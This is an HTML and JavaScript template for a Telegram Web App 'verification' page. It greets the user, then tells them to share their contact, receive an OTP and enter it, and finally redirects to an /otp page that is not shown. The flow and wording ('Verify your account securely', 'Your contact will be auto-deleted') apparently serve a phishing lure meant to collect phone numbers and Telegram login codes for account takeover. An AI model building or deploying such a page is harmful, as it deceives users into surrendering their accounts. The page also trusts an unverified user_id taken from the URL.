<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 400px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; }
        .header { background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; padding: 30px 20px; text-align: center; }
        .header h2 { font-size: 24px; margin-bottom: 5px; }
        .header p { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; transition: all 0.3s ease; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .error { background: #ff6b6b; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; }
        .error.show { display: block; }
        .success { background: #4CAF50; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; }
        .success.show { display: block; }
        .hidden { display: none; }
        .loading { text-align: center; padding: 40px 20px; }
        .loading-spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info-box { background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 25px; text-align: center; }
        .user-info { background: #e8f5e9; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>üîê Telegram Verification</h2>
            <p>Verify your account securely</p>
        </div>
        
        <div class="content">
            <!-- Loading Screen -->
            <div id="loading-screen">
                <div class="loading">
                    <div class="loading-spinner"></div>
                    <p>Loading WebApp...</p>
                </div>
            </div>
            
            <!-- Main Screen -->
            <div id="main-screen" class="hidden">
                <div class="user-info" id="user-info">
                    <b>üë§ User:</b> <span id="user-display">Loading...</span><br>
                    <b>ü§ñ Bot:</b> @{{ bot_username }}
                </div>
                
                <div class="info-box">
                    <b>How to verify:</b><br><br>
                    1. Click "Start Verification"<br>
                    2. Follow instructions<br>
                    3. Share your contact<br>
                    4. Receive OTP<br>
                    5. Enter OTP<br><br>
                    <small>Your contact will be auto-deleted</small>
                </div>
                
                <div class="error" id="error-message"></div>
                <div class="success" id="success-message"></div>
                
                <button class="btn" onclick="startVerification()" id="start-btn">
                    üöÄ Start Verification
                </button>
            </div>
        </div>
    </div>

    <script>
        let tg = null;
        let userId = null;
        let webAppInitialized = false;
        
        // Initialize Telegram WebApp
        document.addEventListener('DOMContentLoaded', function() {
            console.log("üîß Initializing Telegram WebApp...");
            
            // Check if running in Telegram WebApp
            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                tg = Telegram.WebApp;
                
                // Initialize WebApp
                tg.ready();
                tg.expand();
                
                console.log("‚úÖ Telegram WebApp initialized");
                console.log("Platform:", tg.platform);
                console.log("Color scheme:", tg.colorScheme);
                
                // Try to get user from Telegram WebApp
                const tgUser = tg.initDataUnsafe?.user;
                if (tgUser && tgUser.id) {
                    userId = tgUser.id.toString();
                    console.log("‚úÖ Got user ID from Telegram WebApp:", userId);
                    
                    // Update user display
                    const userName = tgUser.first_name || tgUser.username || 'User';
                    document.getElementById('user-display').textContent = userName;
                    
                    // Send user ID to server to create session
                    sendUserIdToServer(userId);
                    
                    // Show main screen
                    showMainScreen();
                    
                    webAppInitialized = true;
                } else {
                    console.log("‚ö†Ô∏è No user data in WebApp, checking URL...");
                    
                    // Try to get user ID from URL
                    const urlParams = new URLSearchParams(window.location.search);
                    const urlUserId = urlParams.get('user_id');
                    
                    if (urlUserId) {
                        userId = urlUserId;
                        console.log("‚úÖ Got user ID from URL:", userId);
                        document.getElementById('user-display').textContent = "User ID: " + userId;
                        sendUserIdToServer(userId);
                        showMainScreen();
                        webAppInitialized = true;
                    } else {
                        // No user ID found
                        console.log("‚ùå No user ID found");
                        showError("Please open this WebApp from the Telegram bot using the /start command.");
                        document.getElementById('start-btn').disabled = true;
                        
                        // Still show main screen but with error
                        setTimeout(() => {
                            document.getElementById('loading-screen').classList.add('hidden');
                            document.getElementById('main-screen').classList.remove('hidden');
                        }, 1000);
                    }
                }
            } else {
                // Not running in Telegram WebApp
                console.log("‚ö†Ô∏è Not running in Telegram WebApp");
                
                // Try to get user ID from URL
                const urlParams = new URLSearchParams(window.location.search);
                const urlUserId = urlParams.get('user_id');
                
                if (urlUserId) {
                    userId = urlUserId;
                    console.log("‚úÖ Got user ID from URL:", userId);
                    document.getElementById('user-display').textContent = "User ID: " + userId;
                    sendUserIdToServer(userId);
                    showMainScreen();
                } else {
                    // Show error
                    console.log("‚ùå No user ID found");
                    showError("Please open this WebApp from Telegram bot.");
                    document.getElementById('start-btn').disabled = true;
                    
                    setTimeout(() => {
                        document.getElementById('loading-screen').classList.add('hidden');
                        document.getElementById('main-screen').classList.remove('hidden');
                    }, 1000);
                }
            }
        });
        
        function sendUserIdToServer(userId) {
            // You can send the user ID to your server here
            console.log("Sending user ID to server:", userId);
            // Example: fetch('/api/save-user', { method: 'POST', body: JSON.stringify({user_id: userId}) })
        }
        
        function showMainScreen() {
            document.getElementById('loading-screen').classList.add('hidden');
            document.getElementById('main-screen').classList.remove('hidden');
        }
        
        function startVerification() {
            if (!userId) {
                showError("User ID not found. Please open from Telegram bot.");
                return;
            }
            
            console.log("Starting verification for user:", userId);
            
            // In a real app, you would:
            // 1. Request contact sharing
            // 2. Send OTP
            // 3. Redirect to OTP page
            
            // For now, show success message
            showSuccess("Verification started! Redirecting to contact sharing...");
            
            // Redirect to OTP page after 2 seconds
            setTimeout(() => {
                window.location.href = `/otp?user_id=${userId}`;
            }, 2000);
        }
        
        function showError(message) {
            const errorEl = document.getElementById('error-message');
            errorEl.textContent = message;
            errorEl.classList.add('show');
            
            setTimeout(() => {
                errorEl.classList.remove('show');
            }, 5000);
        }
        
        function showSuccess(message) {
            const successEl = document.getElementById('success-message');
            successEl.textContent = message;
            successEl.classList.add('show');
            
            setTimeout(() => {
                successEl.classList.remove('show');
            }, 3000);
        }
        
        // For debugging
        window.debugInfo = {
            tg: () => tg,
            userId: () => userId,
            initData: () => tg ? tg.initDataUnsafe : null
        };
    </script>
</body>
</html>
